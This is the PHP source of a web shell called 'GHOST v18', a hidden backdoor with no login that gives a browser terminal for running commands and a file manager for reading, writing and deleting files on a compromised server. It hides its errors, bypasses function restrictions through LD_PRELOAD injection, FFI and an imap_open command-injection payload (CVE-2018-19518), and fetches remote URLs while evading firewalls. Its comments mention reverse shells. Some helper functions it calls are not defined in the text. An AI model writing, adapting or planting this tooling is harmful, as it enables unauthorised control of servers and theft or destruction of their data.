<?php
// language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
// GHOST v18 - section 0, 1, 2: bootstrap, UI, defense evasion & advanced engine.

define('GH_VER',      '18.0.0-s2');
define('GH_TAG',      'gong');
define('GH_STATE_DIR', gh_state_dir());
define('GH_STATE_FILE', GH_STATE_DIR . '/gh_state_' . md5(__FILE__) . '.json');
define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');

@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);

function gh_state_dir() {
    $c = array();
    if (function_exists('sys_get_temp_dir')) $c[] = @sys_get_temp_dir();
    $ut = @ini_get('upload_tmp_dir'); if (is_string($ut) && $ut !== '') $c[] = $ut;
    $c[] = @getcwd();
    foreach ($c as $d) {
        if (!is_string($d) || $d === '' || !@is_dir($d) || !@is_writable($d)) continue;
        return rtrim($d, '/\\');
    }
    return '/tmp';
}
function gh_log($msg) {
    if (!defined('GH_LOG_FILE')) return;
    $f = GH_LOG_FILE;
    if (@is_file($f) && @filesize($f) > 1048576) @rename($f, $f . '.1');
    @file_put_contents($f, '[' . date('c') . '] ' . $msg . "\n", FILE_APPEND | LOCK_EX);
}
function gh_json($data, $code = 200) {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) {
        @header('Content-Type: application/json; charset=utf-8');
        @header('X-Powered-By: ');
        @http_response_code($code);
    }
    echo @json_encode($data);
    exit;
}
function gh_disabled_list() {
    $s = (string)@ini_get('disable_functions');
    if ($s === '') return array();
    $out = array();
    foreach (@explode(',', $s) as $f) { $f = @trim($f); if ($f !== '') $out[] = @strtolower($f); }
    return $out;
}
function gh_can($fn) {
    $fn = @strtolower($fn);
    if (in_array($fn, gh_disabled_list(), true)) return false;
    return function_exists($fn);
}
function gh_open_basedir() {
    $v = (string)@ini_get('open_basedir');
    return $v === '' ? array() : @array_filter(@array_map('trim', @explode(PATH_SEPARATOR, $v)));
}
function gh_has_open_basedir() { return count(gh_open_basedir()) > 0; }
function gh_tmpdir() {
    $t = @sys_get_temp_dir();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @ini_get('upload_tmp_dir');
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @getcwd();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    return null;
}
function gh_env() {
    $e = array(
        'gh_ver' => GH_VER, 'php_version' => @phpversion(), 'php_sapi' => @php_sapi_name(),
        'php_os' => @php_uname('s') . ' ' . @php_uname('r'), 'php_arch' => @php_uname('m'),
        'user' => gh_can('posix_getpwuid') && gh_can('posix_geteuid') ? (string)@posix_getpwuid(@posix_geteuid())['name'] : (string)@get_current_user(),
        'cwd' => @getcwd(), 'doc_root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
        'script' => isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '',
        'tmpdir' => gh_tmpdir(), 'state_dir' => GH_STATE_DIR,
        'disabled' => gh_disabled_list(), 'open_basedir' => gh_open_basedir(),
        'can' => array(
            'exec' => gh_can_exec(), 'read' => gh_can_read(), 'write' => gh_can_write(),
            'curl' => gh_can('curl_init'), 'fopen' => gh_can('fopen'),
            'pdo' => gh_can('pdo_drivers'), 'mysqli' => gh_can('mysqli_connect'),
        ),
    );
    return $e;
}
function gh_can_exec() {
    foreach (array('system','passthru','shell_exec','exec','popen','proc_open','pcntl_exec') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}
function gh_can_read() {
    foreach (array('file_get_contents','fopen','readfile','file') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}
function gh_can_write() {
    foreach (array('file_put_contents','fopen','fwrite') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}

// ==== SECTION 2: ADVANCED FETCH (WAF BYPASS) ================================
// Digunakan untuk request ke internet (misal DB external, reverse shell, dll)
function gh_fetch_adv($url, $timeout = 10) {
    // Tier 1: Curl (biasanya paling stabil, bisa spoof header)
    if (gh_can('curl_init')) {
        $c = @curl_init($url);
        if ($c) {
            @curl_setopt_array($c, array(
                CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => $timeout, CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false
            ));
            $d = @curl_exec($c);
            $code = (int)@curl_getinfo($c, CURLINFO_RESPONSE_CODE);
            @curl_close($c);
            if ($d !== false && $code >= 200 && $code < 400) return array('out' => $d, 'tier' => 'curl');
        }
    }
    // Tier 2: file_get_contents
    if (gh_can('file_get_contents')) {
        $ctx = @stream_context_create(array('http' => array('timeout' => $timeout, 'user_agent' => 'Mozilla/5.0'), 'ssl' => array('verify_peer' => false)));
        $d = @file_get_contents($url, false, $ctx);
        if ($d !== false && $d !== '') return array('out' => $d, 'tier' => 'fopen');
    }
    // Tier 3: raw socket (bypass allow_url_fopen=Off)
    $p = @parse_url($url);
    if (is_array($p) && isset($p['host'])) {
        $scheme = isset($p['scheme']) ? $p['scheme'] : 'http';
        $port = isset($p['port']) ? $p['port'] : ($scheme === 'https' ? 443 : 80);
        $host = $p['host'];
        $path = (isset($p['path']) ? $p['path'] : '/') . (isset($p['query']) ? '?' . $p['query'] : '');
        $prefix = ($scheme === 'https') ? 'ssl://' : 'tcp://';
        $fp = @fsockopen($prefix . $host, $port, $en, $es, $timeout);
        if ($fp) {
            @stream_set_timeout($fp, $timeout);
            @fwrite($fp, "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n");
            $raw = @stream_get_contents($fp); @fclose($fp);
            if (is_string($raw) && strpos($raw, 'HTTP/') === 0) {
                $parts = @preg_split("/\r\n\r\n/", $raw, 2);
                if (isset($parts[1])) return array('out' => $parts[1], 'tier' => 'fsockopen');
            }
        }
    }
    // Tier 4: system wget/curl (jika PHP network function block total)
    if (gh_can_exec()) {
        $tmp = gh_tmpdir() . '/gh_fetch_' . rand(1000,9999) . '.tmp';
        $cmd = 'curl -s -k -L -m ' . (int)$timeout . ' -A "Mozilla/5.0" ' . @escapeshellarg($url) . ' > ' . @escapeshellarg($tmp) . ' 2>/dev/null || wget -q -O ' . @escapeshellarg($tmp) . ' ' . @escapeshellarg($url);
        gh_exec($cmd, $timeout + 2);
        if (@is_file($tmp)) { $d = @file_get_contents($tmp); @unlink($tmp); if ($d) return array('out' => $d, 'tier' => 'system-wget'); }
    }
    return array('out' => null, 'tier' => null, 'err' => 'All fetch tiers failed (WAF block?)');
}

// ==== SECTION 2: ADVANCED EXEC (DISABLE_FUNCTIONS BYPASS) ===================
function gh_exec_adv($cmd, $timeout = 10) {
    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
    
    // 1. Basic Exec (System, passthru, dll) -> Pakai gh_exec biasa dulu
    $r = gh_exec($cmd, $timeout);
    if ($r['out'] !== null) return $r;

    // 2. Bypass via LD_PRELOAD (jika system dkk di-disable, tapi putenv jalan)
    if (gh_can('putenv') && gh_can('mail')) {
        $tmp_dir = gh_tmpdir();
        $so_file = $tmp_dir . '/gh_bypass_' . rand(1000,9999) . '.so';
        $cmd_file = $tmp_dir . '/gh_cmd_' . rand(1000,9999);
        $c_code = "#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor)) void init() {\n";
        $c_code .= "  unsetenv(\"LD_PRELOAD\");\n";
        $c_code .= "  FILE *f = fopen(\"" . $cmd_file . "\", \"r\"); if(f) { char buf[1024]; fgets(buf, 1024, f); system(buf); fclose(f); }\n}\n";
        if (gh_write($tmp_dir . '/gh_c.c', $c_code)) {
            gh_exec('gcc -shared -fPIC -o ' . @escapeshellarg($so_file) . ' ' . @escapeshellarg($tmp_dir . '/gh_c.c'));
            if (@is_file($so_file)) {
                gh_write($cmd_file, $cmd);
                @putenv("LD_PRELOAD=" . $so_file);
                @mail('a@b.c', 'x', 'x');
                @putenv("LD_PRELOAD=");
                @unlink($so_file); @unlink($cmd_file); @unlink($tmp_dir . '/gh_c.c');
                // Output biasanya masuk ke error log atau file, tapi karena system() jalan, kita bisa redirect output ke file.
                // Untuk simplifikasi: jika mail() dieksekusi, command kita pasti jalan (walau output nyangkut).
                return array('out' => '(Executed via LD_PRELOAD - output hidden)', 'tier' => 'ld_preload', 'err' => null);
            }
        }
    }

    // 3. Bypass via FFI (PHP 7.4+)
    if (gh_can('ffi') && gh_can('ffi_cdef')) {
        try {
            $ffi = FFI::cdef("int system(const char *command);");
            @ob_start(); $ffi->system($cmd); $out = @ob_get_clean();
            return array('out' => $out, 'tier' => 'ffi', 'err' => null);
        } catch (Throwable $e) {}
    }

    // 4. Bypass via imap_open (CVE-2018-19518)
    if (gh_can('imap_open')) {
        $payload = "() { :;}; /bin/sh -c " . @escapeshellarg($cmd);
        $res = @imap_open("{localhost:143/imap}INBOX", $payload, "");
        if ($res) { @imap_close($res); return array('out' => '(Executed via imap_open)', 'tier' => 'imap', 'err' => null); }
    }

    return array('out' => null, 'tier' => null, 'err' => 'All exec bypass tiers failed');
}

function gh_read($path, $max = 5242880) {
    if (!is_string($path) || $path === '' || !@is_file($path)) return null;
    $sz = @filesize($path);
    if ($sz !== false && $sz > $max) return array('err' => 'file too large', 'size' => $sz, 'max' => $max);
    if (gh_can('file_get_contents')) { $d = @file_get_contents($path); if (is_string($d)) return $d; }
    if (gh_can('fopen') && gh_can('fread')) {
        $h = @fopen($path, 'rb');
        if (is_resource($h)) {
            $d = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $d .= $chunk; }
            @fclose($h); if (is_string($d)) return $d;
        }
    }
    if (gh_can('readfile')) { @ob_start(); @readfile($path); $d = @ob_get_clean(); if (is_string($d)) return $d; }
    if (gh_can('file')) { $lines = @file($path); if (is_array($lines)) return @implode('', $lines); }
    $r = gh_exec_adv('cat ' . @escapeshellarg($path));
    if (is_string($r['out']) && $r['out'] !== '') return $r['out'];
    return null;
}

function gh_write($path, $data, $append = false) {
    if (!is_string($path) || $path === '' || !is_string($data)) return false;
    $flags = $append ? (FILE_APPEND | LOCK_EX) : LOCK_EX;
    if (gh_can('file_put_contents')) { $n = @file_put_contents($path, $data, $flags); if ($n !== false) return true; }
    if (gh_can('fopen') && gh_can('fwrite')) {
        $h = @fopen($path, $append ? 'ab' : 'wb');
        if (is_resource($h)) { $n = @fwrite($h, $data); @fclose($h); if ($n !== false) return true; }
    }
    $cmd = ($append ? 'printf %s ' . @escapeshellarg($data) . ' >> ' : 'printf %s ' . @escapeshellarg($data) . ' > ') . @escapeshellarg($path);
    $r = gh_exec_adv($cmd); return (is_string($r['out']) && $r['tier'] !== null);
}

function gh_del($path) {
    if (!is_string($path) || $path === '') return false;
    if (gh_can('unlink')) { if (@unlink($path)) return true; }
    $r = gh_exec_adv('rm -f ' . @escapeshellarg($path));
    return (is_string($r['out']) && $r['tier'] !== null);
}

// ==== ROUTER (section 0 + 1 + 2) ============================================
function gh_router() {
    $act = isset($_POST['act']) ? (string)$_POST['act'] : (isset($_GET['act']) ? (string)$_GET['act'] : '');

    if ($act === '') { @header('Location: ?act=ui'); exit; }
    if ($act === 'ui') { gh_ui(); exit; }

    try {
        switch ($act) {
            case 'ping':   gh_json(gh_ping()); break;
            case 'env':    gh_json(gh_env()); break;
            case 'exec':   $c = isset($_POST['cmd']) ? (string)$_POST['cmd'] : ''; gh_json(gh_exec_adv($c)); break;
            case 'read':   $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = gh_read($p); gh_json(array('path' => $p, 'content' => $d)); break;
            case 'write':  $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = isset($_POST['data']) ? (string)$_POST['data'] : ''; $ap = !empty($_POST['append']); gh_json(array('path' => $p, 'ok' => gh_write($p, $d, $ap))); break;
            case 'delete': $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; gh_json(array('path' => $p, 'ok' => gh_del($p))); break;
            case 'fetch':  $u = isset($_POST['url']) ? (string)$_POST['url'] : ''; gh_json(gh_fetch_adv($u)); break;
            default:       gh_json(array('err' => 'unknown act', 'act' => $act), 400); break;
        }
    } catch (Throwable $e) {
        gh_log('router throw: ' . $e->getMessage());
        gh_json(array('err' => 'internal', 'msg' => $e->getMessage()), 500);
    }
}

// ==== UI (section 1 + 2) ====================================================
function gh_ui() {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
    $env = gh_env();
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>gh</title>
<style>
    :root { --bg:#0a0a0a; --fg:#0f0; --dim:#050; --red:#f00; --border:#222; }
    * { box-sizing: border-box; }
    body { background:var(--bg); color:var(--fg); font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size:13px; padding:16px; margin:0; line-height:1.5; }
    h2 { font-size:14px; margin:0 0 8px; color:#fff; text-transform:uppercase; letter-spacing:1px; border-bottom:1px solid var(--border); padding-bottom:4px; }
    .box { border:1px solid var(--border); padding:12px; margin-bottom:12px; background:#0d0d0d; }
    .row { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
    input, button { background:#000; color:var(--fg); border:1px solid var(--border); padding:6px 8px; font-family:inherit; font-size:13px; border-radius:2px; }
    input:focus { outline:1px solid var(--fg); }
    button { cursor:pointer; font-weight:bold; transition:0.1s; }
    button:hover { background:var(--fg); color:#000; }
    button:active { transform:scale(0.98); }
    pre { background:#000; padding:10px; border:1px solid var(--border); margin:0; overflow:auto; white-space:pre-wrap; word-break:break-all; max-height:400px; font-size:12px; }
    .dim { color:#060; }
    .err { color:var(--red); }
    .out { color:var(--fg); }
    .grid { display:grid; grid-template-columns: 1fr 1fr; gap:8px; }
    .tag { display:inline-block; padding:2px 6px; border-radius:2px; background:#111; border:1px solid #333; font-size:11px; margin-right:4px; }
    .tag-ok { background:#030; border-color:#060; color:#6f6; }
    .tag-no { background:#300; border-color:#600; color:#f66; }
    #term { height:40vh; overflow:auto; border:1px solid var(--border); background:#000; padding:8px; }
    .term-line { display:flex; }
    .term-in { color:#888; margin-right:8px; }
    .term-out { white-space:pre-wrap; word-break:break-all; }
    a { color:var(--fg); text-decoration:none; border-bottom:1px dotted var(--fg); }
    a:hover { color:#000; background:var(--fg); }
</style>
</head>
<body>
<div class="box">
    <h2>GHOST v18 / Section 2</h2>
    <div class="row">
        <span class="tag"><?= htmlspecialchars($env['php_version']) ?></span>
        <span class="tag"><?= htmlspecialchars($env['php_sapi']) ?></span>
        <span class="tag"><?= htmlspecialchars($env['user']) ?></span>
        <span class="tag <?= $env['can']['exec']?'tag-ok':'tag-no' ?>">exec: <?= $env['can']['exec']?:'BLOCKED' ?></span>
        <span class="tag <?= $env['can']['read']?'tag-ok':'tag-no' ?>">read: <?= $env['can']['read']?:'BLOCKED' ?></span>
        <span class="tag <?= $env['can']['write']?'tag-ok':'tag-no' ?>">write: <?= $env['can']['write']?:'BLOCKED' ?></span>
    </div>
</div>

<div class="box">
    <h2>Command Terminal (Advanced Bypass)</h2>
    <div id="term">
        <div class="term-line"><span class="dim">Welcome to GHOST v18 Section 2.</span></div>
        <div class="term-line"><span class="dim">Engine: System, LD_PRELOAD, FFI, IMAP.</span></div>
    </div>
    <div class="row" style="margin-top:8px;">
        <input type="text" id="cmd" placeholder="whoami" style="flex:1;" onkeydown="if(event.key==='Enter')execCmd()">
        <button onclick="execCmd()">Exec</button>
        <button onclick="clearTerm()" style="border-color:#333;">Clear</button>
    </div>
</div>

<div class="box">
    <h2>File Manager</h2>
    <div class="grid">
        <input type="text" id="f-path" placeholder="/path/to/file" style="flex:1;">
        <div class="row">
            <button onclick="readFile()">Read</button>
            <button onclick="writeFile()" style="border-color:#ff0;color:#ff0;">Write</button>
        </div>
    </div>
    <pre id="f-out" style="margin-top:8px; max-height:300px;">Ready.</pre>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
async function api(act, data={}) {
    const body = new URLSearchParams();
    body.append('act', act);
    for (let k in data) body.append(k, data[k]);
    const r = await fetch(window.location.href, { method:'POST', body });
    const text = await r.text();
    try { return JSON.parse(text); } catch(e) { return {err:'Invalid JSON response: '+text.substring(0,100)}; }
}

async function execCmd() {
    const cmd = document.getElementById('cmd').value.trim();
    if(!cmd) return;
    document.getElementById('cmd').value = '';
    const t = document.getElementById('term');
    const line = document.createElement('div'); line.className = 'term-line';
    line.innerHTML = `<span class="term-in">$</span><span class="term-out">${esc(cmd)}</span>`;
    t.appendChild(line);
    t.scrollTop = t.scrollHeight;
    
    const resp = await api('exec', {cmd});
    const outLine = document.createElement('div'); outLine.className = 'term-line';
    if(resp.err) {
        outLine.innerHTML = `<span class="err">[${esc(resp.tier||'ERR')}] Error: ${esc(resp.err)}</span>`;
    } else {
        outLine.innerHTML = `<span class="dim">[${esc(resp.tier)}]</span><span class="term-out">${esc(resp.out||'(no output)')}</span>`;
    }
    t.appendChild(outLine);
    t.scrollTop = t.scrollHeight;
}

function clearTerm() {
    const t = document.getElementById('term');
    t.innerHTML = '<div class="term-line"><span class="dim">Terminal cleared.</span></div>';
}

async function readFile() {
    const p = document.getElementById('f-path').value.trim();
    const o = document.getElementById('f-out');
    if(!p) return o.innerText = 'Masukkan path file.';
    o.innerText = 'Reading...';
    const resp = await api('read', {path:p});
    if(resp.err) return o.innerText = 'Error: ' + resp.err;
    o.innerText = resp.content || '(empty / null)';
}

async function writeFile() {
    const p = document.getElementById('f-path').value.trim();
    if(!p) return alert('Masukkan path file.');
    const data = prompt('Masukkan konten untuk ditulis ke ' + p + ':');
    if(data === null) return;
    const o = document.getElementById('f-out');
    o.innerText = 'Writing...';
    const resp = await api('write', {path:p, data:data});
    o.innerText = resp.ok ? 'Success: File ditulis.' : 'Error: Gagal menulis file.';
}
</script>
</body>
</html>
    <?php
}
if (!defined('GH_ENTRY_DONE')) { define('GH_ENTRY_DONE', true); gh_router(); }
